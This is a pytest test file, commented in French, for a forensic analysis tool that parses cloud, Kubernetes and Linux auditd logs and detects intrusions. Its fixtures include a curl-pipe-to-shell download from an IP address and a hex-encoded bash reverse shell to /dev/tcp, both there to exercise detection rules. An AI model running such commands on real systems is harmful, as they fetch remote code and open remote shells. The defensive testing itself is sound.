#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Extensions cloud / identite / Kubernetes / Linux auditd (phoenix_dfir_mcp/ext).

Parsers sur chaque format (detection par le contenu), detections positives ET
negatives (pas de faux positif sur l'administration courante), references de
preuve citables et validees, routage applicable(), et enquete a cinq phases
de bout en bout sur un cas cloud avec un LLM simule."""

import csv
import gzip
import io
import json
import os
import shutil

import pytest

_ROOT = os.path.join(os.path.dirname(__file__), '..', '..')

from phoenix_dfir_mcp import evaluation, evidence_db, memory, pathpolicy, phases, toolkit  # noqa: E402
from phoenix_dfir_mcp.ext import _cloud_formats as formats  # noqa: E402
from phoenix_dfir_mcp.ext import _cloud_rules as rules  # noqa: E402

SUITE = os.path.join(_ROOT, 'eval', 'suite')
M365 = os.path.join(SUITE, 'cloud_m365_bec_oauth')
SIGNINS = os.path.join(M365, 'entra_signins.json')
UAL = os.path.join(M365, 'm365_unified_audit_log.csv')
AWS = os.path.join(SUITE, 'cloud_aws_key_compromise', '418295730216_CloudTrail_eu-west-3_20261013.json.gz')
GCP = os.path.join(SUITE, 'cloud_gcp_external_owner', 'gcp_audit_nb-data-prod.jsonl')
K8S = os.path.join(SUITE, 'k8s_privileged_escape', 'kube-apiserver-audit.log')
AUDITD = os.path.join(SUITE, 'linux_auditd_persistence', 'audit.log')
BENIGN_CSV = os.path.join(SUITE, 'identity_benign_admin', 'InteractiveSignIns_2026-10-12_2026-10-14.csv')
BENIGN_AUDIT = os.path.join(SUITE, 'identity_benign_admin', 'entra_audit_logs.json')


@pytest.fixture(autouse=True)
def _isolation():
    pathpolicy.reset()
    toolkit.reset_evidence_index()
    toolkit.set_active_case(None)
    yield
    pathpolicy.reset()
    toolkit.reset_evidence_index()
    toolkit.set_active_case(None)


def _hunt(path):
    tool = 'linux_audit_hunt' if formats.detect(path)['format'] == 'linux_auditd' else 'cloud_hunt'
    result = toolkit.run_tool(tool, {'file_path': path})
    assert not result.get('error'), result
    return result


def _rules(result):
    return {f['rule'] for f in result['findings']}


def _by_rule(result, rule):
    return [f for f in result['findings'] if f['rule'] == rule]


def _jsonl(path, records):
    path.write_text(''.join(json.dumps(r) + '\n' for r in records), encoding='utf-8')
    return str(path)


# ============================================================================
# Detection du format et routage
# ============================================================================

def test_detection_par_le_contenu(tmp_path):
    assert formats.detect(SIGNINS)['format'] == 'entra_signin'
    assert formats.detect(UAL)['format'] == 'm365_ual'
    det = formats.detect(AWS)
    assert det['format'] == 'aws_cloudtrail' and det['compressed'] and det['container'] == 'json'
    assert formats.detect(GCP)['format'] == 'gcp_audit'
    assert formats.detect(K8S)['format'] == 'k8s_audit'  # .log en JSON lines
    assert formats.detect(AUDITD)['format'] == 'linux_auditd'
    assert formats.detect(BENIGN_CSV)['format'] == 'entra_signin'
    assert formats.detect(BENIGN_AUDIT)['format'] == 'entra_audit'
    # Extension trompeuse : JSON lines UAL dans un .json, auditd dans un .txt
    ual_lines = _jsonl(tmp_path / 'ual.json', [
        {'CreationTime': '2026-10-01T10:00:00', 'Operation': 'FileAccessed', 'Workload': 'SharePoint',
         'RecordType': 6, 'UserId': 'x@corp.fr'}] * 3)
    det = formats.detect(ual_lines)
    assert det['format'] == 'm365_ual' and det['container'] == 'jsonl'
    txt = tmp_path / 'collecte.txt'
    shutil.copy(AUDITD, txt)
    assert formats.detect(str(txt))['format'] == 'linux_auditd'
    # Export Log Analytics (category / properties)
    wrapped = tmp_path / 'signins_la.json'
    wrapped.write_text(json.dumps([{'time': '2026-10-01T10:00:00Z', 'category': 'SignInLogs', 'properties': {
        'userPrincipalName': 'x@corp.fr', 'ipAddress': '1.2.3.4', 'status': {'errorCode': 0}}}]))
    assert formats.detect(str(wrapped))['format'] == 'entra_signin'
    # Non concernes
    generic = tmp_path / 'siem.json'
    generic.write_text(json.dumps([{'timestamp': '2026-10-01', 'message': 'ok'}]))
    assert formats.detect(str(generic))['format'] is None
    assert formats.detect(os.path.join(SUITE, 'ssh_bruteforce_valid_account', 'auth.log'))['format'] is None
    assert formats.detect(os.path.join(SUITE, 'c2_beaconing_firewall', 'firewall_export.csv'))['format'] is None


def test_detect_format_outil_et_routage_applicable(tmp_path):
    out = toolkit.run_tool('cloud_detect_format', {'file_path': AWS})
    assert out['format'] == 'aws_cloudtrail' and out['recommended_tools'] == ['cloud_parse_log', 'cloud_hunt']
    groups, missing = toolkit.applicable_tools(SIGNINS)
    assert groups == [('parsing cloud', ('cloud_parse_log',)), ('detection cloud', ('cloud_hunt',))]
    assert not missing
    assert toolkit.applicable_tools(AUDITD)[0] == [('parsing auditd', ('linux_parse_auditd',)),
                                                   ('detection auditd', ('linux_audit_hunt',))]
    # Les formats generiques restent aux parsers du coeur
    generic = tmp_path / 'siem.json'
    generic.write_text(json.dumps([{'timestamp': '2026-10-01', 'message': 'ok'}]))
    assert toolkit.applicable_tools(str(generic))[0] == [('parsing', ('parse_json_file', 'analyze_artifact'))]
    assert toolkit.applicable_tools(os.path.join(SUITE, 'benign_admin_activity', 'auth.log'))[0][0][1][0] == \
        'parse_log_file'


def test_agent_phases_et_types():
    assert toolkit.agent_for('cloud_hunt') == 'Agent Cloud & Identite'
    assert toolkit.agent_for('linux_parse_auditd') == 'Agent Linux (auditd)'
    by_key = {p.key: p for p in phases.PHASES}
    for name in ('cloud_parse_log', 'cloud_hunt', 'linux_parse_auditd', 'linux_audit_hunt'):
        assert name in by_key['extraction'].tools
        assert name in toolkit.READONLY_TOOLS and name in toolkit.INDEXED_TOOLS
    assert 'cloud_hunt' in by_key['correlation'].tools and 'linux_audit_hunt' in by_key['correlation'].tools
    assert 'cloud_parse_log' in by_key['extraction'].instructions
    assert '.jsonl' in toolkit._KNOWN_TYPES
    assert not [n for n in toolkit.EXT_ERRORS if 'cloud' in n or 'linux' in n]


def test_outil_refuse_un_format_non_cloud(tmp_path):
    generic = tmp_path / 'siem.json'
    generic.write_text('[]')
    assert 'error' in toolkit.run_tool('cloud_parse_log', {'file_path': str(generic)})
    assert 'error' in toolkit.run_tool('linux_parse_auditd', {'file_path': SIGNINS})


# ============================================================================
# Parsers : normalisation de chaque format
# ============================================================================

def test_parse_entra_signins_json():
    out = toolkit.run_tool('cloud_parse_log', {'file_path': SIGNINS})
    assert out['format'] == 'entra_signin' and out['ref_kind'] == 'row'
    ev = out['events'][0]
    assert ev['row'] == 1 and ev['timestamp'].endswith('Z') and ev['operation'] == 'SignIn'
    assert ev['user'].endswith('@nordbridge.fr') and ev['src_ip'] and ev['account'] and ev['user_agent']
    assert all(not k.startswith('_') for e in out['events'] for k in e)
    lagos = [e for e in out['events'] if e.get('city') == 'Lagos']
    assert lagos and lagos[0]['country'] == 'NG' and lagos[0]['lat']


def test_parse_ual_csv_auditdata_et_jsonl(tmp_path):
    out = toolkit.run_tool('cloud_parse_log', {'file_path': UAL})
    assert out['format'] == 'm365_ual' and out['total_events'] == 88
    consent = next(e for e in out['events'] if e['operation'] == 'Consent to application.')
    assert consent['src_ip'] == '102.89.47.13' and consent['account'] and consent['result'] == 'success'
    rule = next(e for e in out['events'] if e['operation'] == 'New-InboxRule' and 'a.martin' in e['user'])
    assert 'ForwardTo=compta.nordbridge@proton.me' in rule['params']
    assert rule['src_ip'] == '102.89.47.13'  # port retire
    # Coherence avec parse_csv : meme numerotation des lignes de donnees
    generic = toolkit.run_tool('parse_csv', {'file_path': UAL})
    assert [e['row'] for e in generic['events']][:5] == [e['row'] for e in out['events']][:5]
    # JSON lines avec AuditData encapsule
    path = _jsonl(tmp_path / 'ual.jsonl', [{'CreationDate': '2026-10-01T10:00:00Z', 'AuditData': json.dumps({
        'CreationTime': '2026-10-01T10:00:00', 'Operation': 'Set-Mailbox', 'Workload': 'Exchange', 'RecordType': 1,
        'UserId': 'admin@corp.fr', 'ClientIP': '[2a01:cb00::1]:4433',
        'Parameters': [{'Name': 'Identity', 'Value': 'ceo@corp.fr'}]})}])
    out = toolkit.run_tool('cloud_parse_log', {'file_path': path})
    assert out['ref_kind'] == 'line' and out['events'][0]['line'] == 1
    assert out['events'][0]['src_ip'] == '2a01:cb00::1' and out['events'][0]['target'] == 'ceo@corp.fr'


def test_parse_entra_csv_portail_et_audit():
    out = toolkit.run_tool('cloud_parse_log', {'file_path': BENIGN_CSV})
    ev = out['events'][0]
    assert ev['auth_requirement'] == 'multiFactorAuthentication' and ev['country'] == 'FR' and ev['row'] == 1
    assert ev['timestamp'] == '2026-10-12T07:00:00Z'
    audit = toolkit.run_tool('cloud_parse_log', {'file_path': BENIGN_AUDIT})
    assert audit['format'] == 'entra_audit'
    assert audit['events'][0]['user'] == 'it.admin@nordbridge.fr' and audit['events'][0]['operation'] == 'Update user'


def test_parse_cloudtrail_gz_gcp_k8s():
    aws = toolkit.run_tool('cloud_parse_log', {'file_path': AWS})
    assert aws['compressed'] and aws['total_events'] == 242 and len(aws['preview']) == 100
    events, _stats = formats.load_events(AWS)
    stop = next(formats.public_view(e) for e in events if e['operation'] == 'StopLogging')
    assert stop['user'] == 'ci-deploy' and stop['account'] == '418295730216' and stop['region'] == 'eu-west-3'
    assert stop['access_key'].startswith('AKIA') and stop['src_ip'] == '185.243.115.84'
    gcp = toolkit.run_tool('cloud_parse_log', {'file_path': GCP})
    owner = next(e for e in gcp['events'] if e['operation'] == 'SetIamPolicy' and e['src_ip'] == '91.92.248.17')
    assert owner['account'] == 'nb-data-prod' and owner['user'] == 'dev.ops@nordbridge.fr' and owner['line'] > 1
    k8s = toolkit.run_tool('cloud_parse_log', {'file_path': K8S})
    assert k8s['ref_kind'] == 'line' and 'preview' not in k8s or len(k8s['preview']) == 100
    ev = next(e for e in k8s['events'] if e.get('subresource') == 'exec' and e.get('stage') == 'ResponseComplete')
    assert ev['user'] == 'system:serviceaccount:web:frontend' and ev['namespace'] == 'default'


def test_gros_journal_apercu_mais_indexation_complete(tmp_path):
    case = tmp_path / 'cas'
    case.mkdir()
    shutil.copy(AWS, case / 'trail.json.gz')
    toolkit.set_active_case(str(case))
    out = toolkit.run_tool('cloud_parse_log', {'file_path': str(case / 'trail.json.gz')})
    assert out['total_events'] == 242 and len(out['preview']) == 100 and 'events' not in out
    assert out['indexed_events'] == 242
    hits = evidence_db.timeline(str(case), user='ci-deploy', contains='StopLogging')
    assert hits['total_events'] == 1 and hits['events'][0]['ref']['kind'] == 'row'
    assert evidence_db.search(str(case), 'nb-finance-reports')['total_matches'] == 40


def test_parse_auditd_groupes_hex_et_enrichi(tmp_path):
    out = toolkit.run_tool('linux_parse_auditd', {'file_path': AUDITD})
    assert out['format'] == 'linux_auditd' and out['ref_kind'] == 'line'
    curl = next(e for e in out['events'] if 'k.sh' in (e.get('command') or ''))
    assert curl['command'] == 'sh -c curl -s http://193.142.146.35/k.sh | sh'  # EXECVE hexadecimal decode
    assert curl['record_types'].startswith('SYSCALL+EXECVE') and curl['user'] == 'uid:33'
    assert curl['timestamp'].startswith('2026-10-15T09:17') and curl['pid'] == '7102'
    keys = next(e for e in out['events'] if 'authorized_keys' in (e.get('target') or ''))
    assert '/root/.ssh/authorized_keys' in keys['target']  # chemin relatif resolu avec CWD
    enriched = tmp_path / 'audit.log'
    enriched.write_text(
        'type=SYSCALL msg=audit(1760000000.100:77): arch=c000003e syscall=59 success=yes exit=0 pid=10 '
        'auid=1000 uid=0 comm="id" exe="/usr/bin/id" key=(null)\x1dARCH=x86_64 SYSCALL=execve AUID="alice" '
        'UID="root"\n'
        'type=EXECVE msg=audit(1760000000.100:77): argc=1 a0="id"\n'
        'node=web01 type=USER_AUTH msg=audit(10/16/2026 08:00:01.000:78): pid=5 uid=0 auid=1000 ses=2 '
        'msg=\'op=PAM:authentication acct="alice" exe="/usr/sbin/sshd" addr=203.0.113.9 res=failed\'\n')
    out = toolkit.run_tool('linux_parse_auditd', {'file_path': str(enriched)})
    first, second = out['events']
    assert first['user'] == 'alice' and first['operation'] == 'execve' and first['line'] == 1
    assert second['host'] == 'web01' and second['result'] == 'failure' and second['src_ip'] == '203.0.113.9'
    assert second['timestamp'] == '2026-10-16T08:00:01Z'


# ============================================================================
# Detections identite : positifs et negatifs
# ============================================================================

def test_spray_fatigue_mfa_et_voyage_impossible():
    res = _hunt(SIGNINS)
    spray = _by_rule(res, 'password_spray')[0]
    assert spray['mitre'] == 'T1110.003' and spray['event_count'] == 8
    assert _by_rule(res, 'spray_success')[0]['severity'] == 'critical'
    mfa = _by_rule(res, 'mfa_fatigue')[0]
    assert mfa['mitre'] == 'T1621' and mfa['severity'] == 'critical' and mfa['event_count'] == 7
    travel = _by_rule(res, 'impossible_travel')[0]
    assert travel['mitre'] == 'T1078.004' and travel['speed_kmh'] > 900
    assert all(r['kind'] == 'row' for f in res['findings'] for r in f['refs'])
    # Chaque ref de constat est presente dans les alertes (indexees et citables)
    cited = {(a.get('row'), a['finding']) for a in res['alerts']}
    assert all((r['value'], f['id']) in cited for f in res['findings'] for r in f['refs'])


def test_identite_benigne_sans_faux_positif():
    assert _hunt(BENIGN_CSV)['findings'] == []  # Paris -> Lyon en journee, une faute de frappe
    assert _hunt(BENIGN_AUDIT)['findings'] == []  # consentement User.Read, administration courante


def _signin(user, when, ip, error=0, req='multiFactorAuthentication', detail='', client='Browser', ua='Mozilla',
            country='FR'):
    return {'createdDateTime': when, 'userPrincipalName': user, 'ipAddress': ip, 'appDisplayName': 'Outlook',
            'clientAppUsed': client, 'userAgent': ua, 'authenticationRequirement': req,
            'status': {'errorCode': error}, 'location': {'countryOrRegion': country},
            'authenticationDetails': [{'authenticationStepResultDetail': detail, 'succeeded': error == 0}]}


def test_mfa_simple_facteur_et_authentification_heritee(tmp_path):
    u = 'bob@corp.fr'
    recs = [_signin(u, '2026-10-01T08:00:00Z', '81.1.1.1', detail='MFA successfully completed'),
            # deux refus seulement : pas de fatigue
            _signin(u, '2026-10-01T09:00:00Z', '81.1.1.1', error=500121, detail='MFA denied'),
            _signin(u, '2026-10-01T09:02:00Z', '81.1.1.1', error=500121, detail='MFA denied'),
            _signin(u, '2026-10-01T09:03:00Z', '81.1.1.1', detail='MFA successfully completed'),
            # simple facteur depuis une IP jamais validee par MFA
            _signin(u, '2026-10-01T10:00:00Z', '81.2.2.2', req='singleFactorAuthentication'),
            # IMAP et ROPC
            _signin('carol@corp.fr', '2026-10-01T11:00:00Z', '81.3.3.3', client='IMAP4',
                    req='singleFactorAuthentication'),
            _signin('dan@corp.fr', '2026-10-01T11:05:00Z', '81.4.4.4', ua='BAV2ROPC',
                    req='singleFactorAuthentication', client='Other clients'),
            # utilisateur sans MFA attendue : pas de constat simple facteur
            _signin('eve@corp.fr', '2026-10-01T12:00:00Z', '81.5.5.5', req='singleFactorAuthentication')]
    path = tmp_path / 'signins.json'
    path.write_text(json.dumps({'value': recs}))
    res = _hunt(str(path))
    assert 'mfa_fatigue' not in _rules(res)
    single = _by_rule(res, 'single_factor_signin')
    assert len(single) == 1 and single[0]['users'] == [u] and single[0]['refs'][0]['value'] == 5
    legacy = {f['users'][0]: f for f in _by_rule(res, 'legacy_auth')}
    assert set(legacy) == {'carol@corp.fr', 'dan@corp.fr'} and legacy['dan@corp.fr']['severity'] == 'high'


def test_voyage_impossible_sans_geo_signale(tmp_path):
    res = _hunt(UAL)
    assert 'impossible_travel' not in _rules(res)
    assert any('no geo' in n for n in res['notes'])


def test_consentement_oauth_et_regles_bec():
    res = _hunt(UAL)
    consent = _by_rule(res, 'oauth_consent')[0]
    assert consent['mitre'] == 'T1528' and consent['application'] == 'MailSync Pro'
    assert {'mail.read', 'mail.readwrite', 'offline_access'} <= set(consent['permissions'])
    rule = _by_rule(res, 'inbox_rule_forward')[0]
    assert rule['severity'] == 'critical' and rule['mitre'].startswith('T1114.003')
    assert rule['recipients'] == ['compta.nordbridge@proton.me']
    # La regle de classement des newsletters (ligne 25) ne declenche rien
    assert all(r['value'] != 25 for f in res['findings'] for r in f['refs'])


def test_transfert_smtp_et_principal_de_service(tmp_path):
    def ual(op, params, user='admin@corp.fr'):
        return {'CreationTime': '2026-10-01T10:00:00', 'Operation': op, 'Workload': 'Exchange', 'RecordType': 1,
                'UserId': user, 'ResultStatus': 'True',
                'Parameters': [{'Name': k, 'Value': v} for k, v in params.items()]}
    path = _jsonl(tmp_path / 'ual.jsonl', [
        ual('Set-Mailbox', {'Identity': 'ceo@corp.fr', 'ForwardingSmtpAddress': 'smtp:drop@evil.example'}),
        ual('Set-Mailbox', {'Identity': 'rh@corp.fr', 'ForwardingSmtpAddress': 'smtp:paie@corp.fr'}),
        ual('New-InboxRule', {'Name': 'Archive projets', 'MoveToFolder': 'Projets'}, user='bob@corp.fr')])
    res = _hunt(path)
    fwd = _by_rule(res, 'mailbox_forwarding')
    assert {f['severity'] for f in fwd} == {'high', 'low'}
    assert 'inbox_rule_hide' not in _rules(res) and 'inbox_rule_forward' not in _rules(res)

    def audit(activity, when, app='EvilApp'):
        return {'activityDisplayName': activity, 'activityDateTime': when, 'result': 'success',
                'category': 'ApplicationManagement', 'loggedByService': 'Core Directory',
                'initiatedBy': {'user': {'userPrincipalName': 'admin@corp.fr', 'ipAddress': '81.1.1.1'}},
                'targetResources': [{'displayName': app, 'type': 'ServicePrincipal', 'modifiedProperties': []}]}
    sp = tmp_path / 'audit.json'
    sp.write_text(json.dumps({'value': [
        audit('Add service principal', '2026-10-01T10:00:00Z'),
        audit('Add service principal credentials', '2026-10-01T10:05:00Z'),
        audit('Add service principal credentials', '2026-10-01T11:00:00Z', app='LegacyBackup')]}))
    found = {f['title']: f for f in _by_rule(_hunt(str(sp)), 'sp_credentials')}
    assert len(found) == 2
    sev = {f['severity'] for t, f in found.items() if 'EvilApp' in t}
    assert sev == {'high'} and {f['severity'] for t, f in found.items() if 'LegacyBackup' in t} == {'low'}


# ============================================================================
# Detections AWS / GCP / Kubernetes
# ============================================================================

def test_aws_compromission_de_cle():
    res = _hunt(AWS)
    assert {'aws_logging_tamper', 'aws_key_new_ip', 'aws_credential_other_user', 'aws_admin_policy',
            'aws_s3_exfil'} <= _rules(res)
    assert _by_rule(res, 'aws_logging_tamper')[0]['severity'] == 'critical'
    assert _by_rule(res, 'aws_credential_other_user')[0]['severity'] == 'high'  # escalade par correlation
    assert _by_rule(res, 'aws_admin_policy')[0]['mitre'] == 'T1098.003'
    assert _by_rule(res, 'aws_s3_exfil')[0]['buckets'] == ['nb-finance-reports']
    # Activite reguliere (console avec MFA, Terraform, role applicatif) : aucun constat
    noisy = {'alice.admin', 'app-backend/i-0a1b2c3d4e5f60718'}
    assert not [f for f in res['findings'] if set(f['users']) & noisy]


def _ct(name, when, ident=None, region='eu-west-1', **kw):
    rec = {'eventTime': when, 'eventSource': kw.pop('source', 'iam.amazonaws.com'), 'eventName': name,
           'awsRegion': region, 'sourceIPAddress': kw.pop('ip', '81.1.1.1'), 'userAgent': 'aws-cli/2.17',
           'userIdentity': ident or {'type': 'IAMUser', 'userName': 'admin', 'accountId': '111122223333',
                                     'arn': 'arn:aws:iam::111122223333:user/admin',
                                     'accessKeyId': 'ASIAEXAMPLE'},
           'recipientAccountId': '111122223333'}
    rec.update(kw)
    return rec


def test_aws_regles_unitaires_et_admin_benin(tmp_path):
    root = {'type': 'Root', 'accountId': '111122223333', 'arn': 'arn:aws:iam::111122223333:root'}
    records = [_ct('DescribeInstances', f'2026-10-01T10:{i:02d}:00Z', source='ec2.amazonaws.com')
               for i in range(30)]
    records += [
        _ct('CreateAccessKey', '2026-10-01T11:00:00Z', requestParameters={}),  # pour soi-meme
        _ct('ConsoleLogin', '2026-10-01T11:01:00Z', source='signin.amazonaws.com',
            responseElements={'ConsoleLogin': 'Success'}, additionalEventData={'MFAUsed': 'Yes'}),
        _ct('UpdateTrail', '2026-10-01T11:02:00Z', source='cloudtrail.amazonaws.com', errorCode='AccessDenied',
            requestParameters={'name': 'main'}),
    ]
    benign = tmp_path / 'benign.json'
    benign.write_text(json.dumps({'Records': records}))
    res = _hunt(str(benign))
    assert {f['severity'] for f in res['findings']} <= {'medium'}  # tentative refusee seulement
    assert _rules(res) == {'aws_logging_tamper_attempt'}
    records += [
        _ct('ConsoleLogin', '2026-10-01T12:00:00Z', source='signin.amazonaws.com',
            responseElements={'ConsoleLogin': 'Success'}, additionalEventData={'MFAUsed': 'No'}),
        _ct('DeleteTrail', '2026-10-01T12:01:00Z', source='cloudtrail.amazonaws.com',
            requestParameters={'name': 'main'}),
        _ct('ListBuckets', '2026-10-01T12:02:00Z', ident=root, source='s3.amazonaws.com'),
        _ct('RunInstances', '2026-10-01T12:03:00Z', region='ap-southeast-1', source='ec2.amazonaws.com'),
        _ct('PutUserPolicy', '2026-10-01T12:04:00Z', requestParameters={
            'userName': 'x', 'policyDocument': '%7B%22Statement%22%3A%5B%7B%22Action%22%3A%22*%22%2C'
                                               '%22Resource%22%3A%22*%22%7D%5D%7D'}),
    ] + [_ct('GetSecretValue', f'2026-10-01T13:00:{i:02d}Z', source='secretsmanager.amazonaws.com',
             requestParameters={'secretId': f'prod/db{i}'}) for i in range(6)]
    full = tmp_path / 'full.json'
    full.write_text(json.dumps({'Records': records}))
    got = _rules(_hunt(str(full)))
    assert {'aws_console_no_mfa', 'aws_logging_tamper', 'aws_root_usage', 'aws_unusual_region',
            'aws_admin_policy', 'aws_secrets_burst'} <= got
    secrets = _by_rule(_hunt(str(full)), 'aws_secrets_burst')[0]
    assert secrets['mitre'] == 'T1555.006' and secrets['event_count'] == 6


def test_gcp_owner_externe_cle_et_puits():
    res = _hunt(GCP)
    owner = _by_rule(res, 'gcp_iam_external')
    assert len(owner) == 1 and owner[0]['severity'] == 'critical'  # le role viewer interne est ignore
    assert owner[0]['member'] == 'user:backup.nb.admin@gmail.com'
    assert _by_rule(res, 'gcp_sa_key')[0]['mitre'] == 'T1098.001'
    assert _by_rule(res, 'gcp_logging_tamper')[0]['mitre'] == 'T1562.008'
    assert len(res['findings']) == 3


def test_kubernetes_evasion_et_controleurs_ignores():
    res = _hunt(K8S)
    rules_found = {f['rule']: f for f in res['findings']}
    assert rules_found['k8s_privileged_workload']['severity'] == 'critical'
    assert rules_found['k8s_privileged_workload']['mitre'] == 'T1611'
    assert rules_found['k8s_exec']['mitre'] == 'T1609'
    assert rules_found['k8s_secrets_enum']['mitre'] == 'T1552.007'
    assert rules_found['k8s_cluster_admin_binding']['mitre'] == 'T1098.006'
    assert len(res['findings']) == 4  # calico (kube-system), prometheus (son espace de noms), ops : rien
    users = {u for f in res['findings'] for u in f['users']}
    assert users == {'system:serviceaccount:web:frontend'}


def test_kubernetes_acces_anonyme(tmp_path):
    def ev(uri, code, resource=None):
        return {'kind': 'Event', 'apiVersion': 'audit.k8s.io/v1', 'stage': 'ResponseComplete', 'verb': 'get',
                'auditID': uri, 'requestURI': uri, 'user': {'username': 'system:anonymous',
                                                            'groups': ['system:unauthenticated']},
                'sourceIPs': ['198.51.100.7'], 'objectRef': {'resource': resource} if resource else {},
                'responseStatus': {'code': code}, 'requestReceivedTimestamp': '2026-10-01T10:00:00.000000Z'}
    path = _jsonl(tmp_path / 'audit.jsonl', [ev('/healthz', 200), ev('/api/v1/secrets', 403, 'secrets'),
                                             ev('/api/v1/namespaces', 200, 'namespaces')])
    anon = _by_rule(_hunt(path), 'k8s_anonymous')
    assert len(anon) == 1 and anon[0]['refs'][0]['value'] == 3 and anon[0]['mitre'] == 'T1078.001'


# ============================================================================
# Detections auditd
# ============================================================================

def test_auditd_persistance_et_sabotage():
    res = _hunt(AUDITD)
    got = {f['mitre'] for f in res['findings']}
    assert {'T1105', 'T1098.004', 'T1548.003', 'T1562.012', 'T1070.002', 'T1059.004'} <= got
    sudo = _by_rule(res, 'auditd_sudoers')
    assert len(sudo) == 1 and '/etc/sudoers.d/90-www' in sudo[0]['title']
    assert all(r['kind'] == 'line' for f in res['findings'] for r in f['refs'])
    # Bruit legitime : passwd, logrotate, apt-get, curl vers un depot, cron -> aucun constat >= medium
    benign_cmds = ('passwd', 'logrotate', 'apt-get', 'nodesource', 'run-parts', 'systemctl')
    for f in res['findings']:
        assert not any(b in f['title'] for b in benign_cmds), f['title']
    add_user = _by_rule(res, 'auditd_add_user')
    assert add_user and add_user[0]['severity'] == 'low'


def test_auditd_negatifs_et_positifs_unitaires(tmp_path):
    log = tmp_path / 'audit.log'
    log.write_text(
        'type=SYSCALL msg=audit(1760000000.000:1): arch=c000003e syscall=82 success=yes exit=0 a0=1 a1=2 '
        'a2=0 a3=0 items=2 ppid=1 pid=20 auid=1000 uid=0 comm="visudo" exe="/usr/sbin/visudo" key="sudoers"\n'
        'type=PATH msg=audit(1760000000.000:1): item=0 name="/etc/sudoers" nametype=CREATE\n'
        'type=SYSCALL msg=audit(1760000100.000:2): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c '
        'a1=55 a2=441 a3=1b6 items=2 ppid=1 pid=21 auid=1000 uid=0 comm="python3" exe="/usr/bin/python3.12" '
        'key="identity"\n'
        'type=PATH msg=audit(1760000100.000:2): item=1 name="/etc/passwd" nametype=NORMAL\n'
        'type=SYSCALL msg=audit(1760000200.000:3): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c '
        'a1=55 a2=0 a3=0 items=1 ppid=1 pid=22 auid=1000 uid=0 comm="cat" exe="/usr/bin/cat" key="identity"\n'
        'type=PATH msg=audit(1760000200.000:3): item=0 name="/etc/shadow" nametype=NORMAL\n'
        'type=SYSCALL msg=audit(1760000300.000:4): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c '
        'a1=55 a2=241 a3=0 items=1 ppid=1 pid=23 auid=1000 uid=0 comm="bash" exe="/usr/bin/bash" key="preload"\n'
        'type=PATH msg=audit(1760000300.000:4): item=0 name="/etc/ld.so.preload" nametype=CREATE\n'
        'type=DAEMON_END msg=audit(1760000400.000:5): op=terminate auid=0 pid=1 res=success\n'
        'type=SYSCALL msg=audit(1760000500.000:6): arch=c000003e syscall=59 success=yes exit=0 a0=1 a1=2 a2=3 '
        'a3=4 items=1 ppid=1 pid=24 auid=1000 uid=0 comm="bash" exe="/usr/bin/bash" key="exec"\n'
        'type=EXECVE msg=audit(1760000500.000:6): argc=3 a0="bash" a1="-c" '
        f'a2={"bash -i >& /dev/tcp/198.51.100.4/4444 0>&1".encode().hex().upper()}\n')
    res = _hunt(str(log))
    by_line = {f['refs'][0]['value']: f for f in res['findings']}
    assert 1 not in by_line  # visudo sur /etc/sudoers : legitime
    assert 5 not in by_line  # lecture de /etc/shadow : pas d'ecriture
    assert by_line[3]['rule'] == 'auditd_account_file' and by_line[3]['mitre'] == 'T1098'
    assert by_line[7]['mitre'] == 'T1574.006' and by_line[7]['severity'] == 'critical'
    assert by_line[9]['mitre'] == 'T1562.012' and by_line[9]['severity'] == 'medium'
    assert by_line[10]['mitre'] == 'T1059.004' and by_line[10]['severity'] == 'critical'


# ============================================================================
# References de preuve : indexees, citables, persistantes
# ============================================================================

@pytest.mark.parametrize('path,parser,hunter', [
    (SIGNINS, 'cloud_parse_log', 'cloud_hunt'),
    (UAL, 'cloud_parse_log', 'cloud_hunt'),
    (AWS, 'cloud_parse_log', 'cloud_hunt'),
    (K8S, 'cloud_parse_log', 'cloud_hunt'),
    (AUDITD, 'linux_parse_auditd', 'linux_audit_hunt'),
])
def test_refs_des_constats_valides(tmp_path, path, parser, hunter):
    case = tmp_path / 'cas'
    case.mkdir()
    target = case / os.path.basename(path)
    shutil.copy(path, target)
    toolkit.set_active_case(str(case))
    assert not toolkit.run_tool(parser, {'file_path': str(target)}).get('error')
    res = toolkit.run_tool(hunter, {'file_path': str(target)})
    refs = [r for f in res['findings'] for r in f['refs']]
    assert refs and all(r['artifact'] == target.name for r in refs)
    valid, invalid = toolkit.validate_refs(refs, str(case))
    assert not invalid and len(valid) == len(refs)
    # Apres redemarrage (index memoire vide), la base du cas suffit
    toolkit.reset_evidence_index()
    valid, invalid = toolkit.validate_refs(refs, str(case))
    assert not invalid
    bogus = [{'artifact': target.name, 'kind': refs[0]['kind'], 'value': 999999}]
    assert toolkit.validate_refs(bogus, str(case))[1]
    # Couverture : parser + detection executes -> aucune lacune pour cet artefact
    assert toolkit.compute_tool_coverage(str(case))['gaps'] == []
    src = {s['tool'] for s in evidence_db.sources(str(case))['sources']}
    assert {parser, hunter} <= src


def test_couverture_exige_les_outils_cloud(tmp_path):
    case = tmp_path / 'cas'
    case.mkdir()
    shutil.copy(SIGNINS, case / 'signins.json')
    toolkit.set_active_case(str(case))
    toolkit.run_tool('parse_json_file', {'file_path': str(case / 'signins.json')})
    gaps = toolkit.compute_tool_coverage(str(case))['gaps']
    assert {g['step'] for g in gaps} == {'parsing cloud', 'detection cloud'}


def test_cloudtrail_csv_historique_et_records_jsonl(tmp_path):
    event = _ct('StopLogging', '2026-10-01T10:00:00Z', source='cloudtrail.amazonaws.com',
                requestParameters={'name': 'main'})
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(['Event ID', 'Event time', 'User name', 'Event name', 'Event source', 'CloudTrail event'])
    writer.writerow(['1', '2026-10-01T10:00:00Z', 'admin', 'StopLogging', 'cloudtrail.amazonaws.com',
                     json.dumps(event)])
    path = tmp_path / 'event_history.csv'
    path.write_text(buf.getvalue())
    res = _hunt(str(path))
    assert _by_rule(res, 'aws_logging_tamper')[0]['refs'][0] == {
        'artifact': 'event_history.csv', 'kind': 'row', 'value': 1}
    gz = tmp_path / 'trail.jsonl.gz'
    with gzip.open(gz, 'wt') as f:
        f.write(json.dumps(event) + '\n')
    assert formats.detect(str(gz))['container'] == 'jsonl'
    assert _by_rule(_hunt(str(gz)), 'aws_logging_tamper')[0]['refs'][0]['kind'] == 'line'


# ============================================================================
# Bout en bout : enquete a cinq phases sur le cas M365 (LLM simule)
# ============================================================================

